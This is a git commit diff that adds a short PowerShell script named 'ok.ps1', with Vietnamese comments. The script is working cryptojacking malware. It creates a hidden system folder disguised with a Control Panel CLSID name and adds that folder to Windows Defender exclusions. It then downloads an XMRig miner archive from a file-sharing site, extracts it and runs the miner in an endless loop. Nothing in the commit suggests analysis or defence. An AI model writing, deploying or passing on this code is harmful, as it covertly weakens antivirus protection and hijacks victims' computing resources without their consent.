571af5c8f5cd2baa6b6d065541ec7a77bd018a0e
43a1723 <hai1723notgay@gmail.com>
2025-02-26 15:39:48 +0700

    Update ok.ps1

--- ok.ps1
+++ ok.ps1
@@ -1,1 +1,20 @@
 
+$rdir = "$env:SystemDrive\ProgramData\Loader"
+$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
+New-Item -ItemType Directory -Path $dir
+Add-MpPreference -ExclusionPath $dir
+attrib +h +s $dir
+
+# tải miner cho SkibiditoiletMiner
+$url = "https://anonsharing.com/file/fcd511aeb8b96fef/xmrig-6.21.0.zip"
+$zipPath = "$dir\xmrig.zip"
+Invoke-WebRequest -Uri $url -OutFile $zipPath
+Expand-Archive -Path $zipPath -DestinationPath $dir -Force
+
+$miner = "$dir\xmrig-6.21.0"
+
+# nạp donate cho SkibiditoiletMiner
+while ($true) {
+    & "$miner\xmrig.exe"
+}
